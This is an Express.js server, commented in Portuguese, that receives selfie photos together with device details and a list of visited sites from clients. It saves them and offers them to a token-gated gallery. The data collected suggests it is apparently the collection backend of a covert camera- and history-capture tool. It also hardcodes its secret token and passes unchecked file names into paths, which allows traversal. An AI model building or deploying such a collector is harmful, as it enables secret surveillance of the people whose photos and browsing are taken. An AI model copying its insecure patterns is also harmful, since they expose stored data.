const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// TOKEN SECRETO - MUDE ISSO!
const TOKEN_SECRETO = 'meusegredo123';

// Middleware de autenticação
const autenticar = (req, res, next) => {
    const token = req.query.token || req.headers['authorization'];
    
    if (token === TOKEN_SECRETO) {
        next();
    } else {
        res.status(401).json({ sucesso: false, mensagem: 'Acesso negado' });
    }
};

// Middleware
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Rota raiz - servir index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota admin
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Rota galeria
app.get('/galeria.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'galeria.html'));
});

// Criar pasta de fotos se não existir (usar /tmp em produção)
const photosDir = process.env.VERCEL ? '/tmp/photos' : path.join(__dirname, 'photos');
if (!fs.existsSync(photosDir)) {
    fs.mkdirSync(photosDir, { recursive: true });
}

// Rota para salvar foto
app.post('/salvar-foto', (req, res) => {
    try {
        const { foto, dispositivo, sitesVisitados, timestamp } = req.body;

        if (!foto) {
            return res.status(400).json({ sucesso: false, mensagem: 'Foto não recebida' });
        }

        // Remover o prefixo data:image/jpeg;base64,
        const base64Data = foto.replace(/^data:image\/jpeg;base64,/, '');

        // Gerar nome do arquivo com timestamp
        const nomeArquivo = `salfie_${Date.now()}.jpg`;
        const caminhoArquivo = path.join(photosDir, nomeArquivo);
        const nomeMetadados = `salfie_${Date.now()}.json`;
        const caminhoMetadados = path.join(photosDir, nomeMetadados);

        // Salvar arquivo de imagem
        fs.writeFileSync(caminhoArquivo, base64Data, 'base64');

        // Salvar metadados em JSON
        const metadados = {
            arquivo: nomeArquivo,
            timestamp: timestamp || new Date().toISOString(),
            dispositivo: dispositivo || {},
            sitesVisitados: sitesVisitados || []
        };
        fs.writeFileSync(caminhoMetadados, JSON.stringify(metadados, null, 2));

        res.json({ 
            sucesso: true, 
            mensagem: 'Foto salva com sucesso!',
            arquivo: nomeArquivo
        });
    } catch (erro) {
        console.error('Erro ao salvar foto:', erro);
        res.status(500).json({ 
            sucesso: false, 
            mensagem: 'Erro ao salvar foto: ' + erro.message 
        });
    }
});

// Rota para listar fotos
app.get('/fotos', autenticar, (req, res) => {
    try {
        const fotos = fs.readdirSync(photosDir);
        // Filtrar apenas arquivos JPG (não JSON)
        const fotosJpg = fotos.filter(f => f.endsWith('.jpg'));
        res.json({ sucesso: true, fotos: fotosJpg });
    } catch (erro) {
        res.status(500).json({ sucesso: false, mensagem: 'Erro ao listar fotos' });
    }
});

// Rota para servir fotos
// Rota para servir fotos
app.get('/fotos/:nome', autenticar, (req, res) => {
    const caminhoArquivo = path.join(photosDir, req.params.nome);
    
    if (fs.existsSync(caminhoArquivo)) {
        res.sendFile(caminhoArquivo);
    } else {
        res.status(404).json({ sucesso: false, mensagem: 'Foto não encontrada' });
    }
});

// Rota para obter metadados de uma foto
app.get('/fotos/:nome/metadata', autenticar, (req, res) => {
    try {
        const nomeJpg = req.params.nome.replace(/\.jpg$/, '');
        const caminhoMetadados = path.join(photosDir, nomeJpg + '.json');
        
        if (fs.existsSync(caminhoMetadados)) {
            const metadados = fs.readFileSync(caminhoMetadados, 'utf8');
            res.json(JSON.parse(metadados));
        } else {
            res.status(404).json({ sucesso: false, mensagem: 'Metadados não encontrados' });
        }
    } catch (erro) {
        res.status(500).json({ sucesso: false, mensagem: 'Erro ao carregar metadados' });
    }
});

const PORT = 8080;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log(`📂 Fotos serão salvas em: ${photosDir}`);
});
